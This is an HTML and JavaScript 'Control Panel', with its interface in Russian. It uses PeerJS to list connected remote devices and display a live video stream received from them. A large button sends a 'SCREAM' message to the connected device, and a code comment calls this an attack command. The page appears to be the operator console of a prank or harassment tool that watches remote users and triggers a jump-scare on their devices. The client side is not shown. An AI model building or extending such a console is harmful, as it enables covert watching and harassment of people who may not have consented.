<!DOCTYPE html>
<html>
<head>
    <title>Панель Управления</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #0b0b0b; color: #eee; font-family: sans-serif; display: flex; height: 100vh; margin: 0; }
        .sidebar { width: 260px; background: #151515; border-right: 1px solid #333; padding: 15px; }
        .user-card { background: #222; padding: 10px; border-radius: 5px; border-left: 4px solid #ff0050; margin-bottom: 10px; font-size: 14px; }
        .main { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        video { width: 100%; max-width: 750px; border: 3px solid #333; border-radius: 10px; background: #000; }
        .btn-scary { background: #ff0050; color: white; border: none; padding: 20px 40px; font-size: 20px; border-radius: 10px; cursor: pointer; margin-top: 20px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="sidebar">
        <h3>Устройства (Online)</h3>
        <div id="user-list"><p style="color: #555;">Поиск соединений...</p></div>
    </div>
    <div class="main">
        <h2 id="status">ОЖИДАНИЕ...</h2>
        <video id="remoteVideo" autoplay playsinline muted></video>
        <button class="btn-scary" onclick="sendScreamer()">⚡ ЗАПУСТИТЬ СКРИМЕР ⚡</button>
    </div>

    <script>
        const MY_ID = '09062012'; //
        const peer = new Peer(MY_ID);
        let currentConn = null;

        peer.on('connection', (conn) => {
            currentConn = conn; //
            const list = document.getElementById('user-list');
            list.innerHTML = `<div class="user-card"><b>ID:</b> ${conn.peer}<br><b>Статус:</b> LIVE</div>`;
        });

        peer.on('call', call => {
            call.answer(); //
            call.on('stream', stream => {
                document.getElementById('remoteVideo').srcObject = stream;
                document.getElementById('status').innerText = "ТРАНСЛЯЦИЯ АКТИВНА";
            });
        });

        function sendScreamer() {
            if (currentConn) {
                currentConn.send('SCREAM'); // Отправляем команду атаки
            } else {
                alert("Нет активного подключения!");
            }
        }
    </script>
</body>
</html>
